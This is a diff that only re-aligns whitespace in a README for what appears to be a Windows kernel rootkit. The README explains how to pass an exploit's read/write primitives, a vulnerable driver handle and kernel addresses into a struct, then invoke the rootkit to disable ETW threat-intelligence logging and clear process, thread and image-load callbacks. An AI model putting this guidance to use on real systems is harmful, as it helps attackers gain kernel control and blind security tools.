@@ -78,12 +78,12 @@ The EXP_OUT struct is as follows:
 //	Set any addresses resolved with GetProcAddress in advance, to avoid BSOD in PreviousMode exploits
 typedef struct _EXP_OUT
 {
-	LPVOID readprimitive;					//	Cast this to _readqword in rootk()
-	LPVOID writeprimitive;					//	Cast this to _writeqword in rootk()
-	DWORD myProcessId;						// To avoid using GetCurrentProcessId() in post-ex code
-	HANDLE vulnDriver;						// For use in cases where IOCTLs must be called for every read/write 
-	ULONGLONG systemEprocess;					// To iterate through EPROCESS list
-	ULONGLONG KeInsertQueueApc;					// To find set ETWti bit and disable it
+	LPVOID readprimitive;				//	Cast this to _readqword in rootk()
+	LPVOID writeprimitive;				//	Cast this to _writeqword in rootk()
+	DWORD myProcessId;				// To avoid using GetCurrentProcessId() in post-ex code
+	HANDLE vulnDriver;				// For use in cases where IOCTLs must be called for every read/write 
+	ULONGLONG systemEprocess;			// To iterate through EPROCESS list
+	ULONGLONG KeInsertQueueApc;			// To find set ETWti bit and disable it
 	ULONGLONG PsSetCreateProcessNotifyRoutine;	// To clear process callbacks
 	ULONGLONG PsSetCreateThreadNotifyRoutine;	// To clear thread callbacks
 	ULONGLONG PsSetLoadImageNotifyRoutine;		// To clear DLL (image load) callbacks
@@ -131,7 +131,7 @@ Obtain the process ID (PID) of the current process:
 
 Use your exploit's read primitive to obtain values of the following kernel-mode functions. This step is OPTIONAL, but necessary to leverage full post-exploitation functionality. *See [this code](Sunder/Sunder/Sunder.cpp) from lines 149-201 for an example of how to find the necessary kernel-mode functions.*
 ```
-	rootStruct->KeInsertQueueApc				= KeInsertQueueApcAddr;
+	rootStruct->KeInsertQueueApc			= KeInsertQueueApcAddr;
 	rootStruct->PsSetCreateProcessNotifyRoutine	= ProcCallbackAddr;
 	rootStruct->PsSetCreateThreadNotifyRoutine	= ThreadCallbackAddr;
 	rootStruct->PsSetLoadImageNotifyRoutine		= DllCallbackAddr;
@@ -139,7 +139,7 @@ Use your exploit's read primitive to obtain values of the following kernel-mode 
 
 Populate rootStruct with the vulnerable kernel driver's handle. This is only required in certain cases, such as when an IOCTL must be called for every use of read/write primitives.
 ```
-	rootStruct->vulnDriver = hDriver;		// Pass vulnerable driver's handle to struct
+	rootStruct->vulnDriver = hDriver;	// Pass vulnerable driver's handle to struct
 ```
 
 Identify the kernel-mode address of an EPROCESS object (preferably the SYSTEM process). This will enable post-exploitation to iterate through kernel EPROCESS structures.
@@ -149,7 +149,7 @@ Identify the kernel-mode address of an EPROCESS object (preferably the SYSTEM pr
 
 Finally, call the rootkit. This will open an interactive menu to execute various kernel-mode payloads.
 ```
-    	rootk(rootStruct);					// Call rootkit functionality for post-exploitation
+    	rootk(rootStruct);			// Call rootkit functionality for post-exploitation
 ```
 
 
